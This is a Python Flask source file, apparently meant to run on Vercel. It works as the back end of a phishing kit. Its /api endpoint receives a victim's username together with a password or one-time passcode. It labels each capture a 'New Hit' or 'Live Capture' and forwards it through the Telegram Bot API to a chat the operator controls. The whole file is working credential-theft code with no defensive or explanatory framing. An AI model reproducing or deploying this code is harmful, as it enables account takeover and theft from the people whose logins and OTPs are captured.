from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# Vercel Environment Variables se data lena
BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

@app.route('/api', methods=['POST'])
def handle_data():
    data = request.json
    data_type = data.get('type')
    user = data.get('user')
    
    msg = f"🚀 **New Hit Detected!**\n👤 User: `{user}`\n"
    
    if data_type == 'LOG' or data_type == 'VERIFIED':
        msg += f"🔑 Pass: `{data.get('pass')}`\n📊 Status: {data_type}"
    elif data_type == 'OTP':
        msg += f"🔢 OTP: `{data.get('otp')}`\n✅ Status: Live Capture"

    # Telegram API Call
    tel_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(tel_url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    
    return jsonify({"status": "ok"})

# Vercel requirement
def handler(event, context):
    return app(event, context)
    
